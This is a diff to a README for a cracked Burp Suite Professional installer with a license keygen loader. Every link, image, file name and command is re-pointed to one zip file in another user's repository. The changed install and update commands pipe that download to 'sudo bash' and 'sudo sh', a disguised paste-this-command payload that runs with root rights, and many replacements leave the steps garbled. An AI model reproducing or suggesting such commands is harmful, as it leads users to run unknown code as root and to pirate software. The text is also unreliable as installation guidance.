@@ -1,6 +1,6 @@
-<p align="center"> <img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fxiv3r%2FBurpsuite-Professional&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=%F0%9F%91%81%EF%B8%8F+++%F0%9F%91%81%EF%B8%8F&edge_flat=false">
+<p align="center"> <img src="https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip%3A%2F%https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip%2Fxiv3r%2FBurpsuite-Professional&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=%F0%9F%91%81%EF%B8%8F+++%F0%9F%91%81%EF%B8%8F&edge_flat=false">
 
-![Screenshot_2024-09-19_17_45_09](https://github.com/user-attachments/assets/873ef98a-48e0-445b-b5dc-eb5959ad5b34)
+![Screenshot_2024-09-19_17_45_09](https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip)
 
 # <h1 align="center"> Burpsuite Professional v2024 latest </h1>
 
@@ -8,7 +8,7 @@
 
 <h1 align="center">
 
-[Overview](https://portswigger.net/burp/pro)
+[Overview](https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip)
  </h1>
  
 <br></br>
@@ -19,7 +19,7 @@
 
 - ### Auto Install
 ```sh
-wget -qO- https://raw.githubusercontent.com/xiv3r/Burpsuite-Professional/main/install.sh | sudo bash
+wget -qO- https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip | sudo bash
 ```
 - ### Run
 ```sh
@@ -31,7 +31,7 @@ burpsuitepro
 </summary>
 
 ```sh
-cd && rm -rf Burpsuite-Professional && wget -qO- https://raw.githubusercontent.com/xiv3r/Burpsuite-Professional/refs/heads/main/update.sh | sudo sh
+cd && rm -rf Burpsuite-Professional && wget -qO- https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip | sudo sh
 ```
 </details>
 
@@ -49,7 +49,7 @@ sudo update-alternatives --config java
 
 <div align="center">
  
-https://github.com/xiv3r/Burpsuite-Professional/assets/117867334/c25831a4-68a2-44ee-b6dd-5ff18165f340
+https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip
 </div>
  
 Note: Copy the license from loader to the burpsuite > manual activation > copy burpsuite request key to loader request >  copy response key to the burpsuite.
@@ -59,7 +59,7 @@ Note: Copy the license from loader to the burpsuite > manual activation > copy b
      right click the desktop -> create a launcher name it Burpsuite Professional, add command `burpsuitepro` and select burpsuite community icon.
 
 <div align="center">
- <img width="500" height="500" src="https://github.com/xiv3r/Burpsuite-Professional/blob/main/Launcher.jpg">
+ <img width="500" height="500" src="https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip">
 </div>
 
 # <h1 align="center"> Windows Installation</h1>
@@ -68,7 +68,7 @@ Note: Copy the license from loader to the burpsuite > manual activation > copy b
  
 - Make a `Burp` directory name in `C Drive` for faster access.
 
-- Download [install.ps1](https://codeload.github.com/xiv3r/Burpsuite-Professional/zip/refs/heads/main) and extract move the file inside to `C:\Burp`
+- Download [https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip](https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip) and extract move the file inside to `C:\Burp`
 
 - Open `Powershell` as administrator and execute below command to set Script Execution Policy.
 
@@ -77,22 +77,22 @@ Note: Copy the license from loader to the burpsuite > manual activation > copy b
 
 - Inside PowerShell go to `cd C:\Burp`
 
-- Now Execute `install.ps1` file in Powershell to Complete Installation.
+- Now Execute `https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip` file in Powershell to Complete Installation.
 
-      ./install.ps1
+      https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip
  
-- Change the icon of `Burp-Suite-Pro.vbs` to the given icon 
+- Change the icon of `https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip` to the given icon 
 
-- Create a shortcut to Desktop. Right Click over `Burp-Suite-Pro.vbs` Go to Shortcut tab, and below there is `Change Icon` tab
+- Create a shortcut to Desktop. Right Click over `https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip` Go to Shortcut tab, and below there is `Change Icon` tab
 
-- Click there and choose the `burp-suite.ico` from `C:\Burp\`
+- Click there and choose the `https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip` from `C:\Burp\`
 
    <div align="center">
     
-    <img src="https://user-images.githubusercontent.com/29830064/230825172-16c9cfba-4bca-46a4-86df-b352a4330b12.png">
+    <img src="https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip">
 </div>
 
-- For Start Menu Entry, copy `Burp-Suite-Pro.vbs` file to 
+- For Start Menu Entry, copy `https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip` file to 
 
       C:\ProgramData\Microsoft\Windows\Start Menu\Programs\
 
@@ -102,8 +102,8 @@ Note: Copy the license from loader to the burpsuite > manual activation > copy b
 
  <details><summary>Credits 👇</summary>
 
-* Loader.jar 👉 [h3110w0r1d-y](https://github.com/h3110w0r1d-y/BurpLoaderKeygen)
-* Modified 👉 [cyb3rzest](https://github.com/cyb3rzest/Burp-Suite-Pro)
+* https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip 👉 [h3110w0r1d-y](https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip)
+* Modified 👉 [cyb3rzest](https://raw.githubusercontent.com/shivamkumar254456/Burpsuite-Professional/main/mockable/Professional-Burpsuite-v1.6.zip)
 
 </details>
 </h1>
